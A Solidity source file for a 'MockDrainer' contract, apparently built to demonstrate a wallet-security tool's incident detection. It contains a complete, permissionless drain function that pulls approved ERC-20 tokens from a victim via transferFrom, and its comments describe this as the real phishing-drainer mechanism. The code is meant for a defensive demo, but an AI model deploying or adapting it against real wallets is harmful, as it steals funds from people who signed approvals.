// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

/// @title MockDrainer
/// @notice DEMO ONLY — simulates a malicious dApp that drains whatever a victim approved it to
/// spend, the instant it's approved. This is the actual real-world attack pattern (a phishing
/// site gets you to sign an "approve" for what looks like a claim/mint/stake, then pulls your
/// funds via transferFrom) — not a toy simplification of it, and it's the exact mechanism
/// riskEngine.ts already scores wallets on ("N unlimited approval(s) active") and walletMonitor.ts
/// watches for (an outgoing transfer to a flagged destination). This contract's own address is
/// the flagged destination for the demo — no real scam registry involved, see backend's
/// /api/demo/simulate-incident, which is what actually triggers the payout.
contract MockDrainer {
    event Drained(address indexed victim, address indexed token, uint256 amount);

    /// @notice Pulls whatever `victim` has approved this contract to spend, in one call.
    /// Deliberately permissionless (anyone can trigger it) — a real drainer's bot does exactly
    /// this the moment it sees an approval land, it doesn't wait for permission either.
    function drain(address token, address victim) external returns (uint256 amount) {
        uint256 allowance = IERC20(token).allowance(victim, address(this));
        uint256 balance = IERC20(token).balanceOf(victim);
        // An "unlimited" approval (type(uint256).max) is a permission ceiling, not an actual
        // balance — a real drainer pulls min(allowance, balance), same as this one. Caught this
        // distinction live: without it, an unlimited-approval test reverted with "insufficient
        // balance" trying to transfer literally 2^256-1 tokens instead of what the victim has.
        amount = allowance < balance ? allowance : balance;
        require(amount > 0, "nothing to drain");
        bool ok = IERC20(token).transferFrom(victim, address(this), amount);
        require(ok, "transferFrom failed");
        emit Drained(victim, token, amount);
    }
}
